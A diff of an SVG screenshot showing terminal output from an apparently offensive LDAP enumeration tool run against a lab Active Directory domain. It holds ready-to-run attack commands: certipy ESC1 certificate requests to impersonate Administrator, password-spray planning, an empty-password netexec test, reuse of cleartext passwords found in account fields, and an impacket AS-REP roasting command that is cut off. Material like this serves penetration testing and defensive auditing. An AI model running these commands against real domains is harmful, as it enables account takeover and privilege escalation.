-<text x="47.3" y="2041.5" fill="#d29922" font-weight="bold" xml:space="preserve">Enterprise Key Admins</text>
-<text x="211.5" y="2041.5" fill="#c9d1d9" xml:space="preserve">  [Universal Security]  0 member(s)  — </text>
-<text x="516.5" y="2041.5" fill="#c9d1d9" opacity="0.65" xml:space="preserve">Members of this group can perform administrative actions on key objects within the forest.</text>
-<text x="16.0" y="2059.0" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="2059.0" fill="#d29922" font-weight="bold" xml:space="preserve">DnsAdmins</text>
-<text x="117.7" y="2059.0" fill="#c9d1d9" xml:space="preserve">  [Domain Local Security]  0 member(s)  — </text>
-<text x="446.1" y="2059.0" fill="#c9d1d9" opacity="0.65" xml:space="preserve">DNS Administrators Group</text>
-<text x="16.0" y="2094.0" fill="#58a6ff" font-weight="bold" xml:space="preserve">╔════════════════════════════════════════════════════════════╗</text>
-<text x="16.0" y="2111.5" fill="#58a6ff" font-weight="bold" xml:space="preserve">║                         COMPUTERS                          ║</text>
-<text x="16.0" y="2129.0" fill="#58a6ff" font-weight="bold" xml:space="preserve">╚════════════════════════════════════════════════════════════╝</text>
-<text x="16.0" y="2146.5" fill="#39c5cf" xml:space="preserve">[*]</text>
-<text x="39.5" y="2146.5" fill="#c9d1d9" xml:space="preserve"> </text>
-<text x="47.3" y="2146.5" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Computers</text>
-<text x="117.7" y="2146.5" fill="#c9d1d9" xml:space="preserve">: </text>
-<text x="133.3" y="2146.5" fill="#f0f6fc" font-weight="bold" xml:space="preserve">1</text>
-<text x="141.1" y="2146.5" fill="#c9d1d9" xml:space="preserve"> total | </text>
-<text x="211.5" y="2146.5" fill="#d29922" xml:space="preserve">1</text>
-<text x="219.3" y="2146.5" fill="#c9d1d9" xml:space="preserve"> DCs | </text>
-<text x="274.1" y="2146.5" fill="#6e7681" xml:space="preserve">0</text>
-<text x="281.9" y="2146.5" fill="#c9d1d9" xml:space="preserve"> EOL OS | </text>
-<text x="360.1" y="2146.5" fill="#6e7681" xml:space="preserve">0</text>
-<text x="367.9" y="2146.5" fill="#c9d1d9" xml:space="preserve"> unconstrained deleg | </text>
-<text x="547.8" y="2146.5" fill="#6e7681" xml:space="preserve">0</text>
-<text x="555.6" y="2146.5" fill="#c9d1d9" xml:space="preserve"> constrained deleg | </text>
-<text x="719.8" y="2146.5" fill="#6e7681" xml:space="preserve">0</text>
-<text x="727.6" y="2146.5" fill="#c9d1d9" xml:space="preserve"> shadow creds</text>
-<text x="16.0" y="2181.5" fill="#39c5cf" font-weight="bold" xml:space="preserve">  ── Domain Controllers ──</text>
-<text x="16.0" y="2199.0" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="2199.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Name</text>
-<text x="78.6" y="2199.0" fill="#c9d1d9" xml:space="preserve">  </text>
-<text x="94.2" y="2199.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">DNS               </text>
-<text x="235.0" y="2199.0" fill="#c9d1d9" xml:space="preserve">  </text>
-<text x="250.6" y="2199.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">OS                                     </text>
-<text x="555.6" y="2199.0" fill="#c9d1d9" xml:space="preserve">  </text>
-<text x="571.2" y="2199.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Last Logon</text>
-<text x="16.0" y="2216.5" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="2216.5" fill="#c9d1d9" opacity="0.65" xml:space="preserve">────  ──────────────────  ───────────────────────────────────────  ──────────</text>
-<text x="16.0" y="2234.0" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="2234.0" fill="#39c5cf" xml:space="preserve">DC01  DC01.corp.local  Windows Server 2022 Standard Evaluation  unknown   </text>
-<text x="16.0" y="2269.0" fill="#58a6ff" font-weight="bold" xml:space="preserve">╔════════════════════════════════════════════════════════════╗</text>
-<text x="16.0" y="2286.5" fill="#58a6ff" font-weight="bold" xml:space="preserve">║                    GROUP POLICY OBJECTS                    ║</text>
-<text x="16.0" y="2304.0" fill="#58a6ff" font-weight="bold" xml:space="preserve">╚════════════════════════════════════════════════════════════╝</text>
-<text x="16.0" y="2321.5" fill="#39c5cf" xml:space="preserve">[*]</text>
-<text x="39.5" y="2321.5" fill="#c9d1d9" xml:space="preserve"> </text>
-<text x="47.3" y="2321.5" fill="#c9d1d9" font-weight="bold" xml:space="preserve">GPOs</text>
-<text x="78.6" y="2321.5" fill="#c9d1d9" xml:space="preserve">: </text>
-<text x="94.2" y="2321.5" fill="#f0f6fc" font-weight="bold" xml:space="preserve">2</text>
-<text x="102.0" y="2321.5" fill="#c9d1d9" xml:space="preserve"> total | </text>
-<text x="172.4" y="2321.5" fill="#d29922" xml:space="preserve">2</text>
-<text x="180.2" y="2321.5" fill="#c9d1d9" xml:space="preserve"> notable</text>
-<text x="16.0" y="2356.5" fill="#39c5cf" font-weight="bold" xml:space="preserve">  ── Notable GPOs ──</text>
-<text x="16.0" y="2374.0" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="2374.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Name                             </text>
-<text x="305.3" y="2374.0" fill="#c9d1d9" xml:space="preserve">  </text>
-<text x="321.0" y="2374.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Path                                                                                </text>
-<text x="977.9" y="2374.0" fill="#c9d1d9" xml:space="preserve">  </text>
-<text x="993.5" y="2374.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Status </text>
-<text x="16.0" y="2391.5" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="2391.5" fill="#c9d1d9" opacity="0.65" xml:space="preserve">─────────────────────────────────  ────────────────────────────────────────────────────────────────────────────────────  ───────</text>
-<text x="16.0" y="2409.0" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="2409.0" fill="#39c5cf" xml:space="preserve">Default Domain Policy              \\corp.local\sysvol\corp.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}  enabled</text>
-<text x="16.0" y="2426.5" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="2426.5" fill="#39c5cf" xml:space="preserve">Default Domain Controllers Policy  \\corp.local\sysvol\corp.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}  enabled</text>
-<text x="16.0" y="2461.5" fill="#58a6ff" font-weight="bold" xml:space="preserve">╔════════════════════════════════════════════════════════════╗</text>
-<text x="16.0" y="2479.0" fill="#58a6ff" font-weight="bold" xml:space="preserve">║                     PASSWORD POLICIES                      ║</text>
-<text x="16.0" y="2496.5" fill="#58a6ff" font-weight="bold" xml:space="preserve">╚════════════════════════════════════════════════════════════╝</text>
-<text x="16.0" y="2531.5" fill="#39c5cf" font-weight="bold" xml:space="preserve">  ── Default Domain Password Policy ──</text>
-<text x="16.0" y="2549.0" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="2549.0" fill="#39c5cf" xml:space="preserve">Min. Password Length:</text>
-<text x="211.5" y="2549.0" fill="#c9d1d9" xml:space="preserve">  7</text>
-<text x="16.0" y="2566.5" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="2566.5" fill="#39c5cf" xml:space="preserve">Password History:</text>
-<text x="180.2" y="2566.5" fill="#c9d1d9" xml:space="preserve">  24 passwords remembered</text>
-<text x="16.0" y="2584.0" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="2584.0" fill="#39c5cf" xml:space="preserve">Max. Password Age:</text>
-<text x="188.0" y="2584.0" fill="#c9d1d9" xml:space="preserve">  unknown</text>
-<text x="16.0" y="2601.5" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="2601.5" fill="#39c5cf" xml:space="preserve">Complexity:</text>
-<text x="133.3" y="2601.5" fill="#c9d1d9" xml:space="preserve">  No complexity requirement</text>
-<text x="16.0" y="2619.0" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="2619.0" fill="#39c5cf" xml:space="preserve">Lockout Threshold:</text>
-<text x="188.0" y="2619.0" fill="#c9d1d9" xml:space="preserve">  0 (disabled)</text>
-<text x="16.0" y="2636.5" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="2636.5" fill="#39c5cf" xml:space="preserve">Lockout Duration:</text>
-<text x="180.2" y="2636.5" fill="#c9d1d9" xml:space="preserve">  unknown</text>
-<text x="16.0" y="2654.0" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="2654.0" fill="#39c5cf" xml:space="preserve">Lockout Obs. Window:</text>
-<text x="203.7" y="2654.0" fill="#c9d1d9" xml:space="preserve">  unknown</text>
-<text x="16.0" y="2689.0" fill="#39c5cf" font-weight="bold" xml:space="preserve">  ── Spray Planning ──</text>
-<text x="16.0" y="2706.5" fill="#3fb950" xml:space="preserve">[+]</text>
-<text x="39.5" y="2706.5" fill="#c9d1d9" xml:space="preserve"> No lockout threshold — unlimited spraying possible (be loud!)</text>
-<text x="16.0" y="2741.5" fill="#58a6ff" font-weight="bold" xml:space="preserve">╔════════════════════════════════════════════════════════════╗</text>
-<text x="16.0" y="2759.0" fill="#58a6ff" font-weight="bold" xml:space="preserve">║                       DOMAIN TRUSTS                        ║</text>
-<text x="16.0" y="2776.5" fill="#58a6ff" font-weight="bold" xml:space="preserve">╚════════════════════════════════════════════════════════════╝</text>
-<text x="16.0" y="2794.0" fill="#39c5cf" xml:space="preserve">[*]</text>
-<text x="39.5" y="2794.0" fill="#c9d1d9" xml:space="preserve"> No trusts found</text>
-<text x="16.0" y="2829.0" fill="#58a6ff" font-weight="bold" xml:space="preserve">╔════════════════════════════════════════════════════════════╗</text>
-<text x="16.0" y="2846.5" fill="#58a6ff" font-weight="bold" xml:space="preserve">║                        DELEGATIONS                         ║</text>
-<text x="16.0" y="2864.0" fill="#58a6ff" font-weight="bold" xml:space="preserve">╚════════════════════════════════════════════════════════════╝</text>
-<text x="16.0" y="2881.5" fill="#39c5cf" xml:space="preserve">[*]</text>
-<text x="39.5" y="2881.5" fill="#c9d1d9" xml:space="preserve"> </text>
-<text x="47.3" y="2881.5" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Delegation findings</text>
-<text x="195.9" y="2881.5" fill="#c9d1d9" xml:space="preserve">: </text>
-<text x="211.5" y="2881.5" fill="#f0f6fc" font-weight="bold" xml:space="preserve">0</text>
-<text x="219.3" y="2881.5" fill="#c9d1d9" xml:space="preserve"> total | </text>
-<text x="289.7" y="2881.5" fill="#6e7681" xml:space="preserve">0</text>
-<text x="297.5" y="2881.5" fill="#c9d1d9" xml:space="preserve"> unconstrained | </text>
-<text x="430.5" y="2881.5" fill="#6e7681" xml:space="preserve">0</text>
-<text x="438.3" y="2881.5" fill="#c9d1d9" xml:space="preserve"> constrained | </text>
-<text x="555.6" y="2881.5" fill="#6e7681" xml:space="preserve">0</text>
-<text x="563.4" y="2881.5" fill="#c9d1d9" xml:space="preserve"> RBCD</text>
-<text x="16.0" y="2916.5" fill="#58a6ff" font-weight="bold" xml:space="preserve">╔════════════════════════════════════════════════════════════╗</text>
-<text x="16.0" y="2934.0" fill="#58a6ff" font-weight="bold" xml:space="preserve">║                ACLs — SENSITIVE PERMISSIONS                ║</text>
-<text x="16.0" y="2951.5" fill="#58a6ff" font-weight="bold" xml:space="preserve">╚════════════════════════════════════════════════════════════╝</text>
-<text x="16.0" y="2986.5" fill="#39c5cf" font-weight="bold" xml:space="preserve">  ── DCSync Rights (DS-Replication-Get-Changes-All) ──</text>
-<text x="16.0" y="3004.0" fill="#3fb950" xml:space="preserve">[+]</text>
-<text x="39.5" y="3004.0" fill="#c9d1d9" xml:space="preserve"> No unexpected DCSync rights detected</text>
-<text x="16.0" y="3039.0" fill="#39c5cf" font-weight="bold" xml:space="preserve">  ── Dangerous Permissions on Sensitive Objects ──</text>
-<text x="16.0" y="3056.5" fill="#3fb950" xml:space="preserve">[+]</text>
-<text x="39.5" y="3056.5" fill="#c9d1d9" xml:space="preserve"> No dangerous permissions detected on sensitive objects</text>
-<text x="16.0" y="3091.5" fill="#58a6ff" font-weight="bold" xml:space="preserve">╔════════════════════════════════════════════════════════════╗</text>
-<text x="16.0" y="3109.0" fill="#58a6ff" font-weight="bold" xml:space="preserve">║                            LAPS                            ║</text>
-<text x="16.0" y="3126.5" fill="#58a6ff" font-weight="bold" xml:space="preserve">╚════════════════════════════════════════════════════════════╝</text>
-<text x="16.0" y="3161.5" fill="#58a6ff" font-weight="bold" xml:space="preserve">╔════════════════════════════════════════════════════════════╗</text>
-<text x="16.0" y="3179.0" fill="#58a6ff" font-weight="bold" xml:space="preserve">║                ADCS — CERTIFICATE SERVICES                 ║</text>
-<text x="16.0" y="3196.5" fill="#58a6ff" font-weight="bold" xml:space="preserve">╚════════════════════════════════════════════════════════════╝</text>
-<text x="16.0" y="3214.0" fill="#3fb950" xml:space="preserve">[+]</text>
-<text x="39.5" y="3214.0" fill="#c9d1d9" xml:space="preserve"> 1 Certificate Authority(ies) found</text>
-<text x="16.0" y="3231.5" fill="#39c5cf" xml:space="preserve">[*]</text>
-<text x="39.5" y="3231.5" fill="#c9d1d9" xml:space="preserve"> </text>
-<text x="47.3" y="3231.5" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Certificate Templates</text>
-<text x="211.5" y="3231.5" fill="#c9d1d9" xml:space="preserve">: </text>
-<text x="227.1" y="3231.5" fill="#f0f6fc" font-weight="bold" xml:space="preserve">34</text>
-<text x="242.8" y="3231.5" fill="#c9d1d9" xml:space="preserve"> total</text>
-<text x="16.0" y="3266.5" fill="#39c5cf" font-weight="bold" xml:space="preserve">  ── CA: CORP-CA ──</text>
-<text x="16.0" y="3284.0" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="3284.0" fill="#39c5cf" xml:space="preserve">Hostname:</text>
-<text x="117.7" y="3284.0" fill="#c9d1d9" xml:space="preserve">  DC01.corp.local</text>
-<text x="16.0" y="3301.5" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="3301.5" fill="#39c5cf" xml:space="preserve">Published templates:</text>
-<text x="203.7" y="3301.5" fill="#c9d1d9" xml:space="preserve">  12</text>
-<text x="16.0" y="3336.5" fill="#39c5cf" font-weight="bold" xml:space="preserve">  ── ESC1 — Enrollee Supplies Subject + Client Auth EKU ──</text>
-<text x="16.0" y="3354.0" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="3354.0" fill="#d29922" font-weight="bold" xml:space="preserve">Welcome-Template</text>
-<text x="16.0" y="3371.5" fill="#c9d1d9" xml:space="preserve">      </text>
-<text x="62.9" y="3371.5" fill="#39c5cf" xml:space="preserve">    EKUs:</text>
-<text x="133.3" y="3371.5" fill="#c9d1d9" xml:space="preserve">  1.3.6.1.5.5.7.3.1, 1.3.6.1.5.5.7.3.2</text>
-<text x="16.0" y="3389.0" fill="#c9d1d9" xml:space="preserve">      </text>
-<text x="62.9" y="3389.0" fill="#39c5cf" xml:space="preserve">    Enrollable by:</text>
-<text x="203.7" y="3389.0" fill="#c9d1d9" xml:space="preserve">  corp.local\svc_ca</text>
-<text x="16.0" y="3406.5" fill="#c9d1d9" xml:space="preserve">      </text>
-<text x="62.9" y="3406.5" fill="#39c5cf" xml:space="preserve">    Exploit:</text>
-<text x="156.8" y="3406.5" fill="#c9d1d9" xml:space="preserve">  </text>
-<text x="16.0" y="3424.0" fill="#c9d1d9" xml:space="preserve">        </text>
-<text x="78.6" y="3424.0" fill="#3fb950" xml:space="preserve">certipy-ad req -u &#x27;svc_ca@corp.local&#x27; -p &#x27;P@ssw0rd!&#x27; -dc-ip 10.10.10.10 -ca &#x27;CORP-CA&#x27; -template &#x27;Welcome-Template&#x27; -upn &#x27;Administrator@corp.local&#x27;</text>
-<text x="16.0" y="3441.5" fill="#c9d1d9" xml:space="preserve">        </text>
-<text x="78.6" y="3441.5" fill="#3fb950" xml:space="preserve">certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.10.10</text>
-<text x="16.0" y="3476.5" fill="#39c5cf" font-weight="bold" xml:space="preserve">  ── ESC1 (config) — not enrollable by current identity ──</text>
-<text x="16.0" y="3494.0" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="3494.0" fill="#c9d1d9" opacity="0.65" xml:space="preserve">Subordinate Certification Authority</text>
-<text x="16.0" y="3511.5" fill="#c9d1d9" xml:space="preserve">      </text>
-<text x="62.9" y="3511.5" fill="#39c5cf" xml:space="preserve">    Enrollment rights:</text>
-<text x="235.0" y="3511.5" fill="#c9d1d9" xml:space="preserve">  Domain Admins, Enterprise Admins</text>
-<text x="16.0" y="3529.0" fill="#39c5cf" xml:space="preserve">[*]</text>
-<text x="39.5" y="3529.0" fill="#c9d1d9" xml:space="preserve"> Above templates match ESC1 config but the current identity cannot enroll — exploitable only after gaining one of the listed identities, or via ESC4 if you can edit the template ACL.</text>
-<text x="16.0" y="3564.0" fill="#58a6ff" font-weight="bold" xml:space="preserve">╔════════════════════════════════════════════════════════════╗</text>
-<text x="16.0" y="3581.5" fill="#58a6ff" font-weight="bold" xml:space="preserve">║                     SHADOW CREDENTIALS                     ║</text>
-<text x="16.0" y="3599.0" fill="#58a6ff" font-weight="bold" xml:space="preserve">╚════════════════════════════════════════════════════════════╝</text>
-<text x="16.0" y="3616.5" fill="#3fb950" xml:space="preserve">[+]</text>
-<text x="39.5" y="3616.5" fill="#c9d1d9" xml:space="preserve"> No objects with msDS-KeyCredentialLink found</text>
-<text x="16.0" y="3651.5" fill="#58a6ff" font-weight="bold" xml:space="preserve">╔════════════════════════════════════════════════════════════╗</text>
-<text x="16.0" y="3669.0" fill="#58a6ff" font-weight="bold" xml:space="preserve">║                         QUICK WINS                         ║</text>
-<text x="16.0" y="3686.5" fill="#58a6ff" font-weight="bold" xml:space="preserve">╚════════════════════════════════════════════════════════════╝</text>
-<text x="16.0" y="3704.0" fill="#c9d1d9" xml:space="preserve">  </text>
-<text x="31.6" y="3704.0" fill="#ff7b72" font-weight="bold" xml:space="preserve">[CRITICAL]</text>
-<text x="109.8" y="3704.0" fill="#c9d1d9" xml:space="preserve"> </text>
-<text x="117.7" y="3704.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">ESC1 — 1 vulnerable template(s)</text>
-<text x="16.0" y="3721.5" fill="#c9d1d9" xml:space="preserve">         </text>
-<text x="86.4" y="3721.5" fill="#c9d1d9" opacity="0.65" xml:space="preserve">Allows requesting a certificate with an arbitrary SAN (e.g., Domain Admin UPN).</text>
-<text x="16.0" y="3739.0" fill="#c9d1d9" xml:space="preserve">         </text>
-<text x="86.4" y="3739.0" fill="#c9d1d9" opacity="0.65" xml:space="preserve">Enrollable by a principal the current identity controls:</text>
-<text x="16.0" y="3756.5" fill="#c9d1d9" xml:space="preserve">         </text>
-<text x="86.4" y="3756.5" fill="#c9d1d9" opacity="0.65" xml:space="preserve">  - Welcome-Template  (enrollable by: corp.local\svc_ca)</text>
-<text x="16.0" y="3774.0" fill="#c9d1d9" xml:space="preserve">         </text>
-<text x="86.4" y="3774.0" fill="#c9d1d9" opacity="0.65" xml:space="preserve">      certipy-ad req -u &#x27;svc_ca@corp.local&#x27; -p &#x27;P@ssw0rd!&#x27; -dc-ip 10.10.10.10 -ca &#x27;CORP-CA&#x27; -template &#x27;Welcome-Template&#x27; -upn &#x27;Administrator@corp.local&#x27;</text>
-<text x="16.0" y="3791.5" fill="#c9d1d9" xml:space="preserve">         </text>
-<text x="86.4" y="3791.5" fill="#c9d1d9" opacity="0.65" xml:space="preserve">      certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.10.10</text>
-<text x="16.0" y="3809.0" fill="#c9d1d9" xml:space="preserve">  </text>
-<text x="31.6" y="3809.0" fill="#d29922" font-weight="bold" xml:space="preserve">[HIGH]</text>
-<text x="78.6" y="3809.0" fill="#c9d1d9" xml:space="preserve"> </text>
-<text x="86.4" y="3809.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">No account lockout policy</text>
-<text x="16.0" y="3826.5" fill="#c9d1d9" xml:space="preserve">         </text>
-<text x="86.4" y="3826.5" fill="#c9d1d9" opacity="0.65" xml:space="preserve">Unlimited password spraying / brute-force is possible without locking accounts.</text>
-<text x="16.0" y="3844.0" fill="#c9d1d9" xml:space="preserve">  </text>
-<text x="31.6" y="3844.0" fill="#39c5cf" font-weight="bold" xml:space="preserve">[MEDIUM]</text>
-<text x="94.2" y="3844.0" fill="#c9d1d9" xml:space="preserve"> </text>
-<text x="102.0" y="3844.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">PASSWD_NOTREQD — 1 account(s)</text>
-<text x="16.0" y="3861.5" fill="#c9d1d9" xml:space="preserve">         </text>
-<text x="86.4" y="3861.5" fill="#c9d1d9" opacity="0.65" xml:space="preserve">These accounts may have empty passwords. Test with: netexec smb ... -u &lt;user&gt; -p &#x27;&#x27;</text>
-<text x="16.0" y="3879.0" fill="#c9d1d9" xml:space="preserve">  </text>
-<text x="31.6" y="3879.0" fill="#39c5cf" font-weight="bold" xml:space="preserve">[MEDIUM]</text>
-<text x="94.2" y="3879.0" fill="#c9d1d9" xml:space="preserve"> </text>
-<text x="102.0" y="3879.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Weak minimum password length (7)</text>
-<text x="16.0" y="3896.5" fill="#c9d1d9" xml:space="preserve">         </text>
-<text x="86.4" y="3896.5" fill="#c9d1d9" opacity="0.65" xml:space="preserve">Short passwords are easier to crack after a hash dump.</text>
-<text x="16.0" y="3914.0" fill="#c9d1d9" xml:space="preserve">  </text>
-<text x="31.6" y="3914.0" fill="#39c5cf" font-weight="bold" xml:space="preserve">[MEDIUM]</text>
-<text x="94.2" y="3914.0" fill="#c9d1d9" xml:space="preserve"> </text>
-<text x="102.0" y="3914.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Password complexity disabled</text>
-<text x="16.0" y="3931.5" fill="#c9d1d9" xml:space="preserve">         </text>
-<text x="86.4" y="3931.5" fill="#c9d1d9" opacity="0.65" xml:space="preserve">Users may set simple dictionary passwords.</text>
-<text x="16.0" y="3949.0" fill="#c9d1d9" xml:space="preserve">  </text>
-<text x="31.6" y="3949.0" fill="#6e7681" font-weight="bold" xml:space="preserve">[INFO]</text>
-<text x="78.6" y="3949.0" fill="#c9d1d9" xml:space="preserve"> </text>
-<text x="86.4" y="3949.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Schema Admins: 1 member(s)</text>
-<text x="16.0" y="3966.5" fill="#c9d1d9" xml:space="preserve">         </text>
-<text x="86.4" y="3966.5" fill="#c9d1d9" opacity="0.65" xml:space="preserve">Administrator</text>
-<text x="16.0" y="3984.0" fill="#c9d1d9" xml:space="preserve">  </text>
-<text x="31.6" y="3984.0" fill="#6e7681" font-weight="bold" xml:space="preserve">[INFO]</text>
-<text x="78.6" y="3984.0" fill="#c9d1d9" xml:space="preserve"> </text>
-<text x="86.4" y="3984.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Enterprise Admins: 1 member(s)</text>
-<text x="16.0" y="4001.5" fill="#c9d1d9" xml:space="preserve">         </text>
-<text x="86.4" y="4001.5" fill="#c9d1d9" opacity="0.65" xml:space="preserve">Administrator</text>
-<text x="16.0" y="4019.0" fill="#c9d1d9" xml:space="preserve">  </text>
-<text x="31.6" y="4019.0" fill="#6e7681" font-weight="bold" xml:space="preserve">[INFO]</text>
-<text x="78.6" y="4019.0" fill="#c9d1d9" xml:space="preserve"> </text>
-<text x="86.4" y="4019.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Domain Admins: 1 member(s)</text>
-<text x="16.0" y="4036.5" fill="#c9d1d9" xml:space="preserve">         </text>
-<text x="86.4" y="4036.5" fill="#c9d1d9" opacity="0.65" xml:space="preserve">Administrator</text>
+<svg xmlns="http://www.w3.org/2000/svg" width="4683" height="6976" viewBox="0 0 4683 6976" font-family='ui-monospace,"Cascadia Code","Source Code Pro",Menlo,Consolas,monospace' font-size="13">
+<rect width="4683" height="6976" rx="6" fill="#0d1117"/>
+<text x="16.0" y="46.5" fill="#c9d1d9" xml:space="preserve">  ██╗     ██╗███████╗████████╗██████╗  █████╗ ██████╗ </text>
+<text x="16.0" y="64.0" fill="#c9d1d9" xml:space="preserve">  ██║     ██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗</text>
+<text x="16.0" y="81.5" fill="#c9d1d9" xml:space="preserve">  ██║     ██║███████╗   ██║   ██║  ██║███████║██████╔╝</text>
+<text x="16.0" y="99.0" fill="#c9d1d9" xml:space="preserve">  ██║     ██║╚════██║   ██║   ██║  ██║██╔══██║██╔═══╝ </text>
+<text x="16.0" y="116.5" fill="#c9d1d9" xml:space="preserve">  ███████╗██║███████║   ██║   ██████╔╝██║  ██║██║     </text>
+<text x="16.0" y="134.0" fill="#c9d1d9" xml:space="preserve">  ╚══════╝╚═╝╚══════╝   ╚═╝   ╚═════╝ ╚═╝  ╚═╝╚═╝     </text>
+<text x="16.0" y="151.5" fill="#c9d1d9" xml:space="preserve">  LDAP enumeration for offensive assessments · v2.19.3</text>
+<text x="16.0" y="186.5" fill="#c9d1d9" xml:space="preserve">[*] Connecting to 10.10.10.10:389 (LDAP)</text>
+<text x="16.0" y="221.5" fill="#c9d1d9" xml:space="preserve">  ✔ Connected</text>
+<text x="16.0" y="239.0" fill="#c9d1d9" xml:space="preserve">    Target:  10.10.10.10:389</text>
+<text x="16.0" y="256.5" fill="#c9d1d9" xml:space="preserve">    Auth:  NTLM</text>
+<text x="16.0" y="274.0" fill="#c9d1d9" xml:space="preserve">    Base DN:  DC=corp,DC=lab</text>
+<text x="16.0" y="291.5" fill="#c9d1d9" xml:space="preserve">[*] GSS-SPNEGO, signed</text>
+<text x="16.0" y="309.0" fill="#6e7681" xml:space="preserve">    ⋯  per-module scan output omitted — Quick Wins summary of all findings below  ⋯</text>
+<text x="16.0" y="344.0" fill="#c9d1d9" xml:space="preserve">╔════════════════════════════════════════════════════════════╗</text>
+<text x="16.0" y="361.5" fill="#c9d1d9" xml:space="preserve">║                         QUICK WINS                         ║</text>
+<text x="16.0" y="379.0" fill="#c9d1d9" xml:space="preserve">╚════════════════════════════════════════════════════════════╝</text>
+<text x="31.7" y="396.5" fill="#ff7b72" font-weight="bold" xml:space="preserve">[CRITICAL]</text>
+<text x="117.8" y="396.5" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Cleartext credential in description — svc-app</text>
+<text x="86.5" y="414.0" fill="#6e7681" xml:space="preserve">Password candidate: </text>
+<text x="243.1" y="414.0" fill="#ff7b72" font-weight="bold" xml:space="preserve">Sup3rSecret1</text>
+<text x="86.5" y="431.5" fill="#6e7681" xml:space="preserve">Full description:   Default password: Sup3rSecret1</text>
+<text x="86.5" y="466.5" fill="#6e7681" xml:space="preserve">Re-run authenticated:</text>
+<text x="86.5" y="484.0" fill="#6e7681" xml:space="preserve">  </text>
+<text x="102.1" y="484.0" fill="#39c5cf" xml:space="preserve">python3 listdap.py -d corp.local -dc 10.10.10.10 -u svc-app -p &#x27;Sup3rSecret1&#x27;</text>
+<text x="31.7" y="501.5" fill="#ff7b72" font-weight="bold" xml:space="preserve">[CRITICAL]</text>
+<text x="117.8" y="501.5" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Cleartext credential in info — svc-app</text>
+<text x="86.5" y="519.0" fill="#6e7681" xml:space="preserve">Password candidate: </text>
+<text x="243.1" y="519.0" fill="#ff7b72" font-weight="bold" xml:space="preserve">Backup2026!</text>
+<text x="86.5" y="536.5" fill="#6e7681" xml:space="preserve">Full info:   backup svc account, pwd: Backup2026!</text>
+<text x="86.5" y="571.5" fill="#6e7681" xml:space="preserve">Re-run authenticated:</text>
+<text x="86.5" y="589.0" fill="#6e7681" xml:space="preserve">  </text>
+<text x="102.1" y="589.0" fill="#39c5cf" xml:space="preserve">python3 listdap.py -d corp.local -dc 10.10.10.10 -u svc-app -p &#x27;Backup2026!&#x27;</text>
+<text x="31.7" y="606.5" fill="#ff7b72" font-weight="bold" xml:space="preserve">[CRITICAL]</text>
+<text x="117.8" y="606.5" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Cleartext credential in userPassword — svc-app</text>
+<text x="86.5" y="624.0" fill="#6e7681" xml:space="preserve">Password: </text>
+<text x="164.8" y="624.0" fill="#ff7b72" font-weight="bold" xml:space="preserve">UnixSecret1</text>
+<text x="86.5" y="659.0" fill="#6e7681" xml:space="preserve">Re-run authenticated:</text>
+<text x="86.5" y="676.5" fill="#6e7681" xml:space="preserve">  </text>
+<text x="102.1" y="676.5" fill="#39c5cf" xml:space="preserve">python3 listdap.py -d corp.local -dc 10.10.10.10 -u svc-app -p &#x27;UnixSecret1&#x27;</text>
+<text x="31.7" y="694.0" fill="#ff7b72" font-weight="bold" xml:space="preserve">[CRITICAL]</text>
+<text x="117.8" y="694.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">AS-REP Roasting — 1 account(s)</text>
+<text x="86.5" y="711.5" fill="#6e7681" xml:space="preserve">Accounts: noauth</text>
+<text x="86.5" y="729.0" fill="#3fb950" font-weight="bold" xml:space="preserve">impacket-GetNPUsers</text>
+<text x="243.1" y="729.0" fill="#d29922" xml:space="preserve">-request</text>
+<text x="313.5" y="729.0" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="368.4" y="729.0" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="462.3" y="729.0" fill="#d29922" xml:space="preserve">-outputfile</text>
